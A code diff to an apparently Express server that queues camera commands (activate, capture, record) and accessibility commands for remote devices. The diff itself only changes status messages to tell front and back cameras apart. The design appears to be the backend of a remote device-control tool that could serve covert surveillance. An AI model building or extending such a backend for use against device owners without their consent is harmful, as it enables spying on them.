@@ -358,7 +358,7 @@ app.post('/api/accessibility-command', (req, res) => {
     }
 });
 
-// 🎯 UPDATED: CAMERA COMMAND ENDPOINT - POST (With custom message format)
+// 🎯 UPDATED: CAMERA COMMAND ENDPOINT - POST (With FIXED back camera message)
 app.post('/api/camera', (req, res) => {
     try {
         const { device_id, action, camera_type, device_model } = req.body;
@@ -395,7 +395,7 @@ app.post('/api/camera', (req, res) => {
         if (writeCommands(commands)) {
             console.log(`✅ Camera command saved: ${action || 'activate'} for ${device_id} (${actualDeviceModel})`);
             
-            // ✅ UPDATED: Custom message format "Front cam model_number current_time"
+            // ✅ UPDATED: Custom message format with FIXED back camera
             const currentTime = new Date().toLocaleTimeString('en-IN', { 
                 hour: '2-digit', 
                 minute: '2-digit',
@@ -405,7 +405,14 @@ app.post('/api/camera', (req, res) => {
             
             let message = '';
             if (action === 'activate') {
-                message = `Front cam ${actualDeviceModel} ${currentTime}`;
+                // ✅ FIXED: Front aur back camera ke liye alag messages
+                if (camera_type === 'front') {
+                    message = `Front cam ${actualDeviceModel} ${currentTime}`;
+                } else if (camera_type === 'back') {
+                    message = `Back cam ${actualDeviceModel} ${currentTime}`;
+                } else {
+                    message = `Camera activated ${actualDeviceModel} ${currentTime}`;
+                }
             } else if (action === 'capture') {
                 message = `Photo captured ${camera_type} cam ${actualDeviceModel} ${currentTime}`;
             } else if (action === 'record') {
@@ -442,7 +449,7 @@ app.post('/api/camera', (req, res) => {
     }
 });
 
-// 🆕 UPDATED GET ENDPOINT - Actual camera response instead of test message
+// 🆕 UPDATED GET ENDPOINT - Back camera response for GET requests
 app.get('/api/camera', (req, res) => {
     const currentTime = new Date().toLocaleTimeString('en-IN', { 
         hour: '2-digit', 
@@ -453,11 +460,11 @@ app.get('/api/camera', (req, res) => {
     
     res.json({
         success: true,
-        message: `Front cam Samsung_Device ${currentTime}`,
+        message: `Back cam Samsung_Device ${currentTime}`,
         method: "GET", 
         device_model: "Samsung_Device",
         action: "activate",
-        camera_type: "front", 
+        camera_type: "back", 
         timestamp: new Date().toISOString(),
         note: "GET request received - Use POST for device-specific commands"
     });
